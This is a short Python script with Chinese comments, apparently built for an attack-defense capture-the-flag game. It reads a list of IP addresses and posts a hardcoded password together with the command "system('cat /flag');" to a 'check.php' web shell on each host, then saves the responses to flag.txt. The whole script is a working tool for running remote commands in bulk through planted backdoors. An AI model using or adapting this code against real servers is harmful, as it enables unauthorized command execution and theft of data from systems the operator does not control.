import pythonping
from concurrent.futures import ThreadPoolExecutor
import requests
import re

# 创建一个空列表，用于存储文件中的每一行
ip = []

# 打开文件
with open('./ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()

payload = {
            "passwd": "109LONGGEshizuidiaode", #109LONGGEshizuidiaode #zzyInvincible
            "cmd": "system('cat /flag');",
        }
url_list = []
for ips in ip:
    url = ips.strip() + ".check.php" #check
    url_list.append(url)

for url in url_list:
    try:
    # print(url1)
        res = requests.post(url, data=payload, timeout=2)
        print(res.text)
        with open("./flag.txt", 'a', encoding='UTF-8') as f: 
            f.write(f"{res.text}\n")

    # print(res.text)
    except:
            pass

